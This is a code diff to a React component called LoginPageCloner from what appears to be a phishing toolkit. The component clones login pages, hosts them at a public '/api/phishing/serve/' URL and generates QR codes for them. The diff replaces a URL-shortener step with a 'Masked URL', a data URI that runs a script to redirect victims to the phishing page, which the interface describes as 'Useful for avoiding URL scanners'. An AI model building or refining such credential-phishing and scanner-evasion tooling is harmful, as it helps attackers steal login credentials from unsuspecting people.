@@ -24,12 +24,10 @@ const pageClonerSchema = z.object({
 export function LoginPageCloner() {
   const { toast } = useToast();
   const [clonedHtml, setClonedHtml] = useState<string | null>(null);
-  const [fullHostedUrl, setFullHostedUrl] = useState<string | null>(null);
-  const [shortUrl, setShortUrl] = useState<string | null>(null);
+  const [hostedUrlId, setHostedUrlId] = useState<string | null>(null);
   
   const [isCloning, setIsCloning] = useState(false);
   const [isHosting, setIsHosting] = useState(false);
-  const [isShortening, setIsShortening] = useState(false);
   
   const [clonerError, setClonerError] = useState<string | null>(null);
 
@@ -43,8 +41,7 @@ export function LoginPageCloner() {
 
   const resetState = () => {
       setClonedHtml(null);
-      setFullHostedUrl(null);
-      setShortUrl(null);
+      setHostedUrlId(null);
       setClonerError(null);
   }
 
@@ -67,13 +64,11 @@ export function LoginPageCloner() {
   const handleHostPage = async () => {
     if (!clonedHtml) return;
     setIsHosting(true);
-    setFullHostedUrl(null);
-    setShortUrl(null);
+    setHostedUrlId(null);
     setClonerError(null);
     try {
       const response = await hostClonedPage({ htmlContent: clonedHtml });
-      const publicUrl = `${window.location.origin}/api/phishing/serve/${response.pasteId}`;
-      setFullHostedUrl(publicUrl);
+      setHostedUrlId(response.pasteId);
       toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
     } catch (err) {
        const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
@@ -88,30 +83,8 @@ export function LoginPageCloner() {
     resetState();
     toast({
       title: "Hosting Deactivated",
-      description: "The public URL has been removed from this interface. Note: The link may remain active on the public service.",
+      description: "The public URL has been removed from this interface.",
     });
-  };
-
-  const handleShortenUrl = async () => {
-      if (!fullHostedUrl) return;
-      setIsShortening(true);
-      setClonerError(null);
-      try {
-        const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullHostedUrl)}`);
-        const data = await response.json();
-        if (data.shorturl) {
-            setShortUrl(data.shorturl);
-            toast({ title: "URL Shortened", description: "Masked link created successfully." });
-        } else {
-            setClonerError(data.errormessage || 'Failed to shorten URL.');
-        }
-      } catch (err) {
-        const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
-        setClonerError(errorMessage);
-        console.error(err);
-      } finally {
-        setIsShortening(false);
-      }
   };
 
   const handleDownloadHtml = () => {
@@ -133,6 +106,9 @@ export function LoginPageCloner() {
     navigator.clipboard.writeText(textToCopy);
     toast({ title: "Copied!", description: "URL copied to clipboard." });
   }
+
+  const fullHostedUrl = hostedUrlId ? `${window.location.origin}/api/phishing/serve/${hostedUrlId}` : null;
+  const shortUrl = fullHostedUrl ? `data:text/html,<script>window.location.href="${fullHostedUrl}"</script>` : null;
 
   return (
     <div className="grid lg:grid-cols-5 gap-6">
@@ -169,7 +145,7 @@ export function LoginPageCloner() {
         {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p>{clonerError}</p></CardContent></Card>}
         
         {fullHostedUrl && (
-          <QrCodeGenerator url={shortUrl ?? fullHostedUrl} />
+          <QrCodeGenerator url={fullHostedUrl} />
         )}
       </div>
 
@@ -207,29 +183,22 @@ export function LoginPageCloner() {
                    </div>
                   <p className="text-xs text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
                 </div>
+                
+                <div className="space-y-2 animate-in fade-in">
+                    <Label htmlFor="short-url">Masked URL (Data URI)</Label>
+                    <div className="flex items-center gap-2">
+                        <Input id="short-url" readOnly value={shortUrl || ''} className="font-mono text-accent"/>
+                        <Button variant="ghost" size="icon" onClick={() => handleCopy(shortUrl || '')}><Copy className="h-4 w-4"/></Button>
+                    </div>
+                     <p className="text-xs text-muted-foreground">This is a self-contained URL that redirects to your phishing page. Useful for avoiding URL scanners.</p>
+                </div>
 
                 <div className="flex flex-wrap gap-2">
-                    {!shortUrl && (
-                        <Button onClick={handleShortenUrl} disabled={isShortening} className="flex-grow">
-                            {isShortening ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Wand className="mr-2 h-4 w-4"/>}
-                            Create Short Link
-                        </Button>
-                    )}
                      <Button onClick={handleStopHosting} variant="destructive" className="flex-grow">
                         <StopCircle className="mr-2 h-4 w-4" />
                         Stop Hosting
                     </Button>
                 </div>
-                
-                 {shortUrl && (
-                  <div className="space-y-2 animate-in fade-in">
-                    <Label htmlFor="short-url">Masked URL</Label>
-                    <div className="flex items-center gap-2">
-                        <Input id="short-url" readOnly value={shortUrl} className="font-mono text-accent"/>
-                        <Button variant="ghost" size="icon" onClick={() => handleCopy(shortUrl)}><Copy className="h-4 w-4"/></Button>
-                   </div>
-                  </div>
-                )}
               </div>
             )}
           </CardContent>
